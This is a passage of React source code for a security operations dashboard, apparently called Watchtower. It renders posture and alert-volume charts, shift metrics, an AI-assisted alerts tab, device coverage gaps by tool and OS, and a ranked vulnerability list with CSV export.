                  <div onClick={()=>setModal({type:'tools'})} style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'12px 14px',cursor:'pointer',transition:'border-color .15s'}}
                    onMouseEnter={e=>e.currentTarget.style.borderColor='#4f8fff40'} onMouseLeave={e=>e.currentTarget.style.borderColor='var(--wt-border)'}>
                    <div style={{display:'flex',alignItems:'center',gap:6,flexWrap:'wrap'}}>
                      <span style={{fontSize:'0.8rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>Tools</span>
                      <span style={{fontSize:'0.86rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:'#22d49a'}}>{Object.keys(connectedTools).length} connected</span>
                      <span style={{marginLeft:'auto',fontSize:'0.8rem',color:'#4f8fff'}}>Details ↗</span>
                    </div>
                    {Object.keys(connectedTools).length===0&&!demoMode&&(
                      <div style={{fontSize:'0.86rem',color:'#f0a030',marginTop:6}}>No tools connected — <button onClick={e=>{e.stopPropagation();setShowOnboarding(true);setOnboardingStep(0);}} style={{color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontFamily:'inherit',fontSize:'inherit',padding:0,textDecoration:'underline'}}>Setup wizard →</button></div>
                    )}
                  </div>
                </div>

              </div>

              {/* ── POSTURE TREND + NOISE REDUCTION ─────────────────────────────── */}
              <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:10}} className='wt-two-col'>
                {/* Posture trend */}
                <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px'}}>
                  <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:12}}>
                    <span style={{fontSize:'0.86rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>7-Day Posture Trend</span>
                    <span style={{marginLeft:'auto',fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:postureColor}}>{posture}</span>
                  </div>
                  <svg viewBox='0 0 200 50' style={{width:'100%',height:50}}>
                    <polyline fill='none' stroke={postureColor} strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'
                      points={POSTURE_TREND.map((v,i)=>`${(i/(POSTURE_TREND.length-1))*200},${50-((v/100)*46)}`).join(' ')} />
                    <polyline fill={postureColor+'18'} stroke='none'
                      points={[`0,50`,...POSTURE_TREND.map((v,i)=>`${(i/(POSTURE_TREND.length-1))*200},${50-((v/100)*46)}`),`200,50`].join(' ')} />
                    {POSTURE_TREND.map((v,i)=>(
                      <circle key={i} cx={(i/(POSTURE_TREND.length-1))*200} cy={50-((v/100)*46)} r='3' fill={postureColor} />
                    ))}
                  </svg>
                  <div style={{display:'flex',justifyContent:'space-between',marginTop:4}}>
                    {['7d','6d','5d','4d','3d','2d','1d'].map(d=><span key={d} style={{fontSize:'0.84rem',color:'var(--wt-dim)'}}>{d}</span>)}
                  </div>
                </div>
                {/* 7-day Alert Volume */}
                <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px'}}>
                  <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:10}}>
                    <span style={{fontSize:'0.86rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>7-Day Alert Volume</span>
                    <span style={{marginLeft:'auto',fontSize:'0.86rem',fontWeight:700,color:'var(--wt-secondary)'}}>{totalAlerts} total</span>
                  </div>
                  {(()=>{
                    const days=['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
                    const today=new Date().getDay();
                    const labels=Array.from({length:7},(_,i)=>days[(today-6+i+7)%7]);
                    const buckets=Array(7).fill(0);
                    const now=Date.now();
                    alerts.forEach(a=>{
                      if(a.rawTime){const daysAgo=Math.floor((now-new Date(a.rawTime).getTime())/86400000);if(daysAgo>=0&&daysAgo<7)buckets[6-daysAgo]++;}
                      else{buckets[Math.floor(Math.random()*7)]++;}
                    });
                    const maxB=Math.max(...buckets,1);
                    return(
                      <div style={{display:'flex',alignItems:'flex-end',gap:4,height:48}}>
                        {buckets.map((n,i)=>{
                          const h=Math.max(4,Math.round((n/maxB)*44));
                          const isToday=i===6;
                          return(
                            <div key={i} style={{flex:1,display:'flex',flexDirection:'column',alignItems:'center',gap:2}}>
                              {n>0&&<span style={{fontSize:'0.46rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{n}</span>}
                              <div style={{width:'100%',height:h,borderRadius:'3px 3px 0 0',background:isToday?'#4f8fff':n>maxB*0.7?'#f0405e':n>maxB*0.4?'#f97316':'#4f8fff60',transition:'height .4s'}} />
                              <span style={{fontSize:'0.46rem',color:isToday?'#4f8fff':'var(--wt-dim)',fontWeight:isToday?700:400}}>{labels[i]}</span>
                            </div>
                          );
                        })}
                      </div>
                    );
                  })()}
                  <div style={{marginTop:8,display:'flex',gap:12,fontSize:'0.82rem',color:'var(--wt-muted)'}}>
                    <span><span style={{color:'#22d49a',fontWeight:700}}>{fpAlerts.length}</span> FP auto-closed</span>
                    <span><span style={{color:'#f0405e',fontWeight:700}}>{tpAlerts.length}</span> TP confirmed</span>
                  </div>
                </div>
              </div>

              {/* ── SHIFT METRICS ───────────────────────────────────────────── */}
              <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px'}}>
                <div style={{fontSize:'0.86rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:10}}>Shift Metrics</div>
                <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8}} className='wt-four-col'>
                  {[
                    {label:'Unacked Criticals',value:unackedCritCount,color:unackedCritCount>0?'#f0405e':'#22d49a',sub:'need triage now'},
                    {label:'SLA Breaches',value:slaBreaches,color:slaBreaches>0?'#f0405e':'#22d49a',sub:'open cases over SLA'},
                    {label:'FPs Auto-Closed',value:fpAlerts.length,color:'#22d49a',sub:'AI noise reduction'},
                    {label:slaStats&&!demoMode?'MTTA Critical':'Tools Live',value:slaStats&&!demoMode?(slaStats.mttaMinutes&&slaStats.mttaMinutes.Critical!=null?slaStats.mttaMinutes.Critical+'m':'—'):Object.keys(connectedTools).length,color:Object.keys(connectedTools).length>0?'#4f8fff':'#f0a030',sub:slaStats&&!demoMode?'min avg to ack':'feeding alerts'},
                  ].map(m=>(
                    <div key={m.label} style={{textAlign:'center',padding:'10px',background:'var(--wt-card2)',borderRadius:8}}>
                      <div style={{fontSize:'1.6rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:m.color}}>{m.value}</div>
                      <div style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-secondary)',marginTop:2}}>{m.label}</div>
                      <div style={{fontSize:'0.86rem',color:'var(--wt-dim)',marginTop:1}}>{m.sub}</div>
                    </div>
                  ))}
                </div>
              </div>

            </div>
          )}



          {/* ═══════════════════════════════ ALERTS ══════════════════════════════════ */}{activeTab==='alerts' && (
              <AlertsTab
                alerts={alerts} demoMode={demoMode} automation={automation} liveVulns={liveVulns} liveAlerts={liveAlerts} customIntel={customIntel}
                autColor={autColor} autLabel={autLabel}
                fpAlerts={fpAlerts} tpAlerts={tpAlerts}
                alertSearch={alertSearch} setAlertSearch={setAlertSearch}
                alertSevFilter={alertSevFilter} setAlertSevFilter={setAlertSevFilter}
                alertSrcFilter={alertSrcFilter} setAlertSrcFilter={setAlertSrcFilter}
                alertSort={alertSort} setAlertSort={setAlertSort}
                alertPage={alertPage} setAlertPage={setAlertPage}
                alertTotalPages={alertTotalPages} alertPageClamped={alertPageClamped}
                alertsSorted={alertsSorted} alertsFiltered={alertsFiltered}
                alertsPaged={alertsPaged} ALERT_PAGE_SIZE={ALERT_PAGE_SIZE}
                selectedAlerts={selectedAlerts} setSelectedAlerts={setSelectedAlerts}
                expandedAlerts={expandedAlerts} setExpandedAlerts={setExpandedAlerts}
                alertNotes={alertNotes} setAlertNotes={setAlertNotes}
                editingNote={editingNote} setEditingNote={setEditingNote}
                noteInput={noteInput} setNoteInput={setNoteInput}
                alertOverrides={alertOverrides} setAlertOverrides={setAlertOverrides}
                aiTriageCache={aiTriageCache}
                createdIncidents={createdIncidents} setCreatedIncidents={setCreatedIncidents}
                alertSnoozes={alertSnoozes} setAlertSnoozes={setAlertSnoozes}
                setActiveTab={setActiveTab} userTier={userTier}
                alertAssignees={alertAssignees} setAlertAssignees={setAlertAssignees}
                onAudit={(entry)=>fetch('/api/audit',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify(entry)}).catch(()=>{})}
                autoClosedIds={autoClosedIds}
                isAdmin={isAdmin}
                syncStatus={syncStatus}
                onAutoIncident={(alert, triageResult)=>{
                  // Called by AlertsTab when Full Auto triage confirms TP — create incident + auto-investigate
                  const incId='INC-AUTO-'+String(Date.now()).slice(-6);
                  const inc={
                    id:incId,
                    title:`[AI] ${alert.title}`,
                    severity:alert.severity,
                    status:'Active',
                    created:new Date().toLocaleString(),
                    updated:new Date().toLocaleString(),
                    alertCount:1,
                    devices:alert.device?[alert.device]:[],
                    mitreTactics:alert.mitre?[alert.mitre]:[],
                    aiSummary:triageResult?.reasoning||`APEX confirmed True Positive: ${alert.title}. Auto-created by Full Auto mode.`,
                    alerts:[alert.id],
                    timeline:[{time:new Date().toLocaleString(),event:'APEX AI confirmed True Positive',actor:'APEX AI',type:'detection'},{time:new Date().toLocaleString(),event:'Incident auto-created by Full Auto mode',actor:'Watchtower',type:'action'}],
                    assignedTo:'AI',
                  };
                  setCreatedIncidents(prev=>[inc,...prev]);
                  setActiveTab('incidents');
                  // Auto-investigate will fire via the effect watching createdIncidents.length
                }}
              />
            )}

          {/* ═══════════════════════════════ COVERAGE ═══════════════════════════════ */}
          {activeTab==='coverage' && (
            <div style={{display:'flex',flexDirection:'column',gap:14}}>
              <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:4,flexWrap:'wrap'}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Coverage</h2>
                <span style={{fontSize:'0.86rem',color:coveredPct>=90?'#22d49a':'#f0a030',background:coveredPct>=90?'#22d49a12':'#f0a03012',padding:'2px 8px',borderRadius:4,fontWeight:600,border:`1px solid ${coveredPct>=90?'#22d49a25':'#f0a03025'}`}}>{coveredPct}% covered</span>
                {!demoMode&&liveKnownDevices.length>0&&<span style={{fontSize:'0.84rem',color:'#00b3e3',background:'#00b3e310',padding:'2px 8px',borderRadius:4,border:'1px solid #00b3e325',fontWeight:600}}>✦ {liveKnownDevices.length} devices{liveCoverageDevices.length>0?` (${liveCoverageDevices.length} from MDM)`:' from Tenable'}</span>}
                <div style={{display:'flex',gap:5,flexWrap:'wrap',marginLeft:'auto',alignItems:'center'}}>
                  <span style={{fontSize:'0.82rem',color:'var(--wt-dim)',marginRight:2}}>OS:</span>
                  {Object.entries(osBreakdown).sort((a,b)=>b[1]-a[1]).slice(0,4).map(([os,n])=>(
                    <span key={os} style={{fontSize:'0.82rem',padding:'2px 7px',borderRadius:4,background:'var(--wt-border)',color:'var(--wt-muted)',fontWeight:600}}>{os} <strong style={{color:'var(--wt-text)'}}>{n}</strong></span>
                  ))}
                  <span style={{fontSize:'0.82rem',padding:'2px 7px',borderRadius:4,background:'#4f8fff12',color:'#4f8fff',fontWeight:700,border:'1px solid #4f8fff20',marginLeft:4}}>Total: {demoMode?totalDevices:liveKnownDevices.length||totalDevices}</span>
                </div>
              </div>

              {/* Per-tool coverage — only connected tools */}
              <div>
                <div style={{fontSize:'0.86rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>
                  Tool Coverage Across Estate
                  {!demoMode&&activeTools.length===0&&<span style={{marginLeft:8,fontSize:'0.82rem',color:'#f0a030',fontWeight:600,textTransform:'none'}}>— no tools connected</span>}
                </div>
                {activeTools.length===0&&!demoMode ? (
                  <div style={{padding:'14px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:10,fontSize:'0.86rem',color:'var(--wt-dim)',textAlign:'center'}}>
                    Connect tools in the Tools tab to see coverage analysis.
                  </div>
                ) : (
                <div style={{display:'flex',flexDirection:'column',gap:6}}>
                  {activeTools.map(tool=>{
                    const estateSize = !demoMode && liveKnownDevices.length > 0 ? liveKnownDevices.length : totalDevices;
                    const DEMO_PCTS = {crowdstrike:96,defender:91,darktrace:100,splunk:98,tenable:84,proofpoint:100,sentinel:100};
                    const DEMO_COUNTS = {crowdstrike:237,defender:225,tenable:208,splunk:247,sentinel:247,darktrace:247,proofpoint:247};
                    const demoPct = DEMO_PCTS[tool.id] || 88;
                    const isVulnTool = ['tenable','nessus','qualys','wiz'].includes(tool.id);
                    const livePct = !demoMode
                      ? isVulnTool
                        ? (liveVulns.length > 0 ? 100 : 0)
                        : estateSize > 0
                          ? Math.round(((estateSize - gapDevices.filter(d=>d.missing.some(m=>m.toLowerCase().includes(tool.name.split(' ')[0].toLowerCase()))).length) / estateSize) * 100)
                          : demoPct
                      : demoPct;
                    const pct = demoMode ? demoPct : livePct;
                    const gapCount = Math.max(0, Math.round(estateSize*(1-pct/100)));
                    const coveredCount = estateSize - gapCount;
                    // Show actual device count from sourceDeviceCounts if available
                    const rawCount = !demoMode && sourceDeviceCounts[tool.id] ? sourceDeviceCounts[tool.id] : (demoMode ? (DEMO_COUNTS[tool.id]||Math.round(estateSize*pct/100)) : coveredCount);
                    const pctColor = pct>=95?'#22d49a':pct>=75?'#f0a030':'#f0405e';
                    return (
                      <div key={tool.id} onClick={()=>setGapToolFilter(gapToolFilter===tool.id?null:tool.id)} style={{padding:'10px 14px',background:gapToolFilter===tool.id?'var(--wt-card2)':'var(--wt-card)',border:`1px solid ${gapToolFilter===tool.id?'#4f8fff40':'#141820'}`,borderRadius:10,display:'flex',alignItems:'center',gap:12,cursor:'pointer'}}>
                        <div style={{width:120,fontSize:'0.84rem',fontWeight:600,flexShrink:0}}>{tool.name}</div>
                        <div style={{flex:1,height:8,background:'var(--wt-border)',borderRadius:4,overflow:'hidden'}}>
                          <div style={{height:'100%',background:`linear-gradient(90deg,${pctColor},${pctColor}aa)`,borderRadius:4,width:`${pct}%`,transition:'width 1s'}} />
                        </div>
                        <span style={{fontSize:'0.8rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:pctColor,minWidth:28,textAlign:'right'}}>{pct}%</span>
                        <span style={{fontSize:'0.84rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:'var(--wt-text)',minWidth:36,textAlign:'right'}}>{rawCount.toLocaleString()}</span>
                        <span style={{fontSize:'0.8rem',color:'var(--wt-dim)',minWidth:14}}>dev</span>
                        <span style={{fontSize:'0.84rem',minWidth:70,textAlign:'right'}}>{gapCount>0?<span style={{color:'#f0a030'}}>{gapCount} miss</span>:<span style={{color:'#22d49a'}}>✓ Full</span>}</span>
                      </div>
                    );
                  })}
                </div>
                )}
              </div>

              {/* OS Breakdown — from connected tools */}
              {(()=>{
                const devices = demoMode ? DEMO_GAP_DEVICES : liveKnownDevices.length > 0 ? liveKnownDevices : DEMO_GAP_DEVICES;
                const OS_COLORS = {'Windows':'#00a4ef','macOS':'#a8b2c1','Linux':'#f97316','Ubuntu':'#e95420','RHEL':'#cc0000','iOS':'#a8b2c1','Android':'#3ddc84','Unknown':'#6b7a94'};
                const OS_ICONS = {'Windows':'🪟','macOS':'🍎','Linux':'🐧','Ubuntu':'🐧','RHEL':'🎩','iOS':'📱','Android':'🤖','Unknown':'💻'};
                const breakdown = devices.reduce((acc,d)=>{
                  const raw = d.os || 'Unknown';
                  // Normalise: strip version numbers, map to family
                  const family = raw.match(/windows/i)?'Windows':raw.match(/mac|darwin/i)?'macOS':raw.match(/ubuntu/i)?'Ubuntu':raw.match(/rhel|red hat/i)?'RHEL':raw.match(/linux/i)?'Linux':raw.match(/ios/i)?'iOS':raw.match(/android/i)?'Android':'Unknown';
                  acc[family]=(acc[family]||0)+1;
                  return acc;
                },{});
                const entries = Object.entries(breakdown).sort((a,b)=>b[1]-a[1]);
                const total = entries.reduce((s,[,n])=>s+n,0);
                if (!entries.length) return null;
                return (
                  <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px 16px'}}>
                    <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:12}}>
                      <span style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'1px'}}>OS Breakdown</span>
                      {!demoMode&&liveKnownDevices.length>0&&<span style={{fontSize:'0.86rem',color:'#22d49a',background:'#22d49a0a',padding:'1px 6px',borderRadius:3,border:'1px solid #22d49a20',fontWeight:600}}>✦ live</span>}
                      {demoMode&&<span style={{fontSize:'0.86rem',color:'#f0a030',padding:'1px 6px',borderRadius:3,fontWeight:600}}>demo</span>}
                      <span style={{marginLeft:'auto',fontSize:'0.84rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{total.toLocaleString()} devices</span>
                    </div>
                    {/* Stacked bar */}
                    <div style={{height:10,borderRadius:5,overflow:'hidden',display:'flex',marginBottom:10,gap:1}}>
                      {entries.map(([os,n])=>(
                        <div key={os} title={`${os}: ${n} (${Math.round(n/total*100)}%)`} style={{height:'100%',background:OS_COLORS[os]||'#6b7a94',flex:n,transition:'flex 0.5s'}} />
                      ))}
                    </div>
                    {/* Legend rows */}
                    <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:6}} className='wt-three-col'>
                      {entries.map(([os,n])=>{
                        const pct = Math.round(n/total*100);
                        const col = OS_COLORS[os]||'#6b7a94';
                        return (
                          <div key={os} style={{display:'flex',alignItems:'center',gap:7,padding:'5px 8px',background:`${col}08`,border:`1px solid ${col}20`,borderRadius:7}}>
                            <span style={{fontSize:'0.86rem',flexShrink:0}}>{OS_ICONS[os]||'💻'}</span>
                            <div style={{flex:1,minWidth:0}}>
                              <div style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-text)'}}>{os}</div>
                              <div style={{fontSize:'0.8rem',color:'var(--wt-dim)'}}>{n.toLocaleString()} devices</div>
                            </div>
                            <span style={{fontSize:'0.8rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:col}}>{pct}%</span>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                );
              })()}

              {/* Devices with gaps */}
              <div>
                <div style={{fontSize:'0.86rem',fontWeight:700,color:'#f0405e',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>Devices with Gaps ({gapDevices.length})</div>
                <div style={{display:'flex',flexDirection:'column',gap:6}}>
                  {/* CSV export button */}
                  {gapToolFilter && (
                    <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:8}}>
                      <span style={{fontSize:'0.84rem',color:'#4f8fff',fontWeight:600}}>Showing devices missing {ALL_TOOLS.find(t=>t.id===gapToolFilter)?.name||gapToolFilter}</span>
                      <button onClick={()=>{
                        const filtered = gapDevices.filter(d=>d.missing.some(m=>ALL_TOOLS.find(t=>t.id===gapToolFilter)?.name && m.includes(ALL_TOOLS.find(t=>t.id===gapToolFilter).name.split(' ')[0])));
                        const csv = ['Hostname,IP,OS,Missing Tools,Reason,Last Seen', ...filtered.map(d=>`${d.hostname},${d.ip},${d.os},"${d.missing.join('; ')}","${d.reason}",${d.lastSeen}`)].join('\n');
                        const blob = new Blob([csv],{type:'text/csv'});
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a'); a.href=url; a.download=`coverage-gaps-${gapToolFilter}.csv`; a.click();
                        URL.revokeObjectURL(url);
                      }} style={{padding:'3px 10px',borderRadius:5,border:'1px solid #22d49a30',background:'#22d49a10',color:'#22d49a',fontSize:'0.86rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Export CSV ↓</button>
                      <button onClick={()=>setGapToolFilter(null)} style={{padding:'3px 8px',borderRadius:5,border:'1px solid var(--wt-border)',background:'none',color:'var(--wt-muted)',fontSize:'0.84rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Clear ×</button>
                    </div>
                  )}
                  {(gapToolFilter ? gapDevices.filter(d=>d.missing.some(m=>ALL_TOOLS.find(t=>t.id===gapToolFilter)?.name && m.includes(ALL_TOOLS.find(t=>t.id===gapToolFilter).name.split(' ')[0]))) : gapDevices).map(dev=>{
                    const heatColor = dev.lastSeenDays>7?'#f0405e':dev.lastSeenDays>3?'#f0a030':dev.lastSeenDays>1?'#f0c030':'#22d49a';
                    const heatLabel = dev.lastSeenDays>7?'Stale >7d':dev.lastSeenDays>3?`${dev.lastSeenDays}d ago`:dev.lastSeenDays>1?`${dev.lastSeenDays}d ago`:'Recent'; return (
                    <div key={dev.hostname} style={{padding:'12px 14px',background:'var(--wt-card)',border:`1px solid ${heatColor}28`,borderLeft:`3px solid ${heatColor}`,borderRadius:10}}>
                      <div style={{display:'flex',alignItems:'flex-start',gap:10}}>
                        <div style={{flex:1}}>
                          <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:4}}>
                            <span style={{fontSize:'0.8rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace'}}>{dev.hostname}</span>
                            <span style={{fontSize:'0.84rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{dev.ip}</span>
                            <span style={{fontSize:'0.82rem',color:'var(--wt-muted)'}}>{dev.os}</span>
                            <span style={{fontSize:'0.46rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:`${heatColor}18`,color:heatColor,border:`1px solid ${heatColor}30`,marginLeft:'auto'}}>{heatLabel}</span>
                          </div>
                          <div style={{display:'flex',gap:5,flexWrap:'wrap',marginBottom:4}}>
                            {dev.missing.map(m=>{
                              const catColor = m.includes('Falcon')||m.includes('Defender')||m.includes('SentinelOne')||m.includes('Carbon Black')?'#f0405e':m.includes('Splunk')||m.includes('Sentinel')||m.includes('QRadar')||m.includes('Elastic')?'#f0a030':m.includes('Tenable')||m.includes('Nessus')||m.includes('Qualys')?'#8b6fff':'#4f8fff';
                              return <span key={m} style={{fontSize:'0.86rem',fontWeight:700,padding:'3px 8px',borderRadius:4,background:`${catColor}14`,color:catColor,border:`1px solid ${catColor}28`,display:'flex',alignItems:'center',gap:4}}><span style={{fontSize:'0.84rem'}}>✗</span>{m}</span>;
                            })}
                          </div>
                          <div style={{fontSize:'0.82rem',color:'var(--wt-muted)'}}>{dev.reason} · Last seen {dev.lastSeen}</div>
                        </div>
                        <button onClick={()=>setDeployAgentDevice(dev)} style={{padding:'5px 12px',borderRadius:7,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',fontSize:'0.84rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Deploy Agent →</button>
                      </div>
                    </div>
                  );})}
                </div>
              </div>
            </div>
          )}

          {/* ═══════════════════════════════ VULNS ══════════════════════════════════ */}
          {activeTab==='vulns' && (
            <div style={{display:'flex',flexDirection:'column',gap:12}}>
              <div style={{display:'flex',alignItems:'center',gap:10,marginBottom:4,flexWrap:'wrap'}}>
                <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Vulnerabilities</h2>
                {!demoMode && liveVulns.length>0 && <span style={{fontSize:'0.84rem',color:'#22d49a',background:'#22d49a0a',padding:'2px 8px',borderRadius:4,border:'1px solid #22d49a25',fontWeight:600}}>✦ Live · {liveVulns.length} from Tenable</span>}
                {demoMode && <span style={{fontSize:'0.84rem',color:'#f0a030',background:'#f0a03010',padding:'2px 8px',borderRadius:4,fontWeight:600}}>Demo data</span>}
                <span style={{fontSize:'0.86rem',color:'#f0405e',background:'#f0405e12',padding:'2px 8px',borderRadius:4}}>Ranked by severity × prevalence</span>
                {kevVulns.length>0 && <span style={{fontSize:'0.86rem',color:'#f97316',background:'#f9731612',padding:'2px 8px',borderRadius:4,border:'1px solid #f9731625',fontWeight:700}}>{kevVulns.length} CISA KEV — 72h</span>}
              </div>
              <div style={{display:'grid',gridTemplateColumns:'1fr 290px',gap:14,alignItems:'start'}} className='wt-two-col'>
              {/* LEFT — vuln list */}
              <div>
              <div style={{display:'flex',flexDirection:'column',gap:14}}>
                {(()=>{
                  const getProduct = (title) => {
                    const t = title || '';
                    const match = t.match(/^([\w\s]+?)\s+(?:vulnerability|vuln|RCE|CVE|NTLM|path|auth|injection|heap|buffer|overflow|exploit|remote|command|privilege|escalation|bypass|disclosure|zero)/i);
                    return match ? match[1].trim() : t.split(' ').slice(0,2).join(' ');
                  };
                  const sevOrder = {Critical:0,High:1,Medium:2,Low:3};
                  const sevScore = v => (v.affectedAssets?.length||v.affected||1)*10 + (v.cvss||0);
                  // Criticals always at top — hard sort by severity tier first, then score within tier
                  const sorted = [...vulns].sort((a,b)=>{
                    const sa=sevOrder[a.severity]??4, sb=sevOrder[b.severity]??4;
                    if(sa!==sb) return sa-sb;
                    return sevScore(b)-sevScore(a);
                  });
                  return sorted.map((vuln,rank)=>(
                  <div key={vuln.id}>
                    <div className='vuln-row' onClick={()=>setSelectedVuln(selectedVuln?.id===vuln.id?null:vuln)} style={{padding:'10px 14px',background:selectedVuln?.id===vuln.id?'#0c1428':'var(--wt-card)',border:`1px solid ${selectedVuln?.id===vuln.id?'#4f8fff':'var(--wt-border)'}`,borderRadius:10,display:'flex',alignItems:'center',gap:12}}>
                      <div style={{flex:1,minWidth:0}}>
                        <div style={{display:'flex',alignItems:'center',gap:7,marginBottom:2}}>
                          <span style={{fontSize:'0.86rem',fontWeight:700}}>{vuln.title}</span>
                          {vuln.kev && <span style={{fontSize:'0.58rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f97316',color:'#fff',flexShrink:0}}>CISA KEV</span>}
                        </div>
                        <div style={{display:'flex',gap:6,alignItems:'center',flexWrap:'wrap'}}>
                          <SevBadge sev={vuln.severity} />
                          {vuln.cvss&&vuln.cvss!=='N/A'&&<span style={{fontSize:'0.84rem',color:'#4f8fff',fontFamily:'JetBrains Mono,monospace',fontWeight:700}}>CVSS {vuln.cvss}</span>}
                          <span style={{fontSize:'0.84rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{vuln.cve && vuln.cve !== 'null' ? vuln.cve : ''}</span>
                          <span style={{fontSize:'0.82rem',color:'var(--wt-muted)'}}>{(vuln.affectedAssets?.length || vuln.affected || 1)} device{(vuln.affectedAssets?.length || vuln.affected || 1)!==1?'s':''} affected</span>
                          <span style={{fontSize:'0.82rem',color:'#f0a030'}}>{vuln.prevalence!=null?`${vuln.prevalence}% prevalence`:`${vuln.source||'Tenable'}`}</span>
                        </div>
                      </div>
                      <span style={{fontSize:'0.86rem',color:'#4f8fff',flexShrink:0}}>{selectedVuln?.id===vuln.id?'▲':'▼'}</span>
                    </div>
                    {selectedVuln?.id===vuln.id && (
                      <div style={{padding:'14px 16px',background:'var(--wt-card2)',border:'1px solid #4f8fff40',borderTop:'2px solid #4f8fff',borderRadius:'0 0 10px 10px',marginBottom:0,boxShadow:'0 4px 20px rgba(0,0,0,0.3)'}}>
                        <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:16}} className='wt-two-col'>
                          <div>
                            <div style={{fontSize:'0.86rem',color:'var(--wt-secondary)',lineHeight:1.65,marginBottom:10}}>{vuln.description}</div>
                            <div style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Affected Devices</div>
                            <div style={{display:'flex',alignItems:'center',gap:8,flexWrap:'wrap',marginBottom:6}}>
                              <span style={{fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:'#f0a030'}}>{(vuln.affectedAssets||vuln.affectedDevices||[vuln.device].filter(Boolean)).length}</span>
                              <span style={{fontSize:'0.8rem',color:'var(--wt-secondary)'}}>device{(vuln.affectedAssets||vuln.affectedDevices||[]).length!==1?'s':''} affected</span>
                              {(vuln.affectedAssets||vuln.affectedDevices||[]).length > 0 && (
                                <button onClick={e=>{e.stopPropagation();const assets=vuln.affectedAssets||vuln.affectedDevices||[vuln.device].filter(Boolean);const csv=['Hostname,CVE,Severity,Plugin'].concat(assets.map(h=>`${h},${vuln.cve||'N/A'},${vuln.severity},${vuln.sourceId||''}`)).join('\n');const blob=new Blob([csv],{type:'text/csv'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download=`${(vuln.cve||vuln.id).replace(/[^a-z0-9]/gi,'_')}_assets.csv`;a.click();URL.revokeObjectURL(url);}} style={{padding:'3px 10px',borderRadius:5,border:'1px solid #22d49a30',background:'#22d49a0a',color:'#22d49a',fontSize:'0.86rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:4}}>⬇ Export CSV</button>
                              )}
                            </div>
                            {(()=>{const assets=(vuln.affectedAssets||vuln.affectedDevices||[vuln.device].filter(Boolean));if(!assets.length) return null;const show=assets.slice(0,8);const rest=assets.length-8;return(<div style={{display:'flex',flexWrap:'wrap',gap:4,marginTop:4}}>{show.map(d=>(<span key={d} style={{fontSize:'0.84rem',fontFamily:'JetBrains Mono,monospace',padding:'2px 7px',borderRadius:4,background:'#f0a03010',border:'1px solid #f0a03025',color:'#f0c070'}}>{d}</span>))}{rest>0&&<span style={{fontSize:'0.84rem',color:'var(--wt-dim)',padding:'2px 7px'}}>+{rest} more</span>}</div>);})()}
                            <div style={{marginTop:10,display:'flex',gap:6,flexWrap:'wrap'}}>
                              {vuln.patch && <div style={{fontSize:'0.8rem',color:'#22d49a',width:'100%'}}>📦 Patch: <strong>{vuln.patch}</strong></div>}
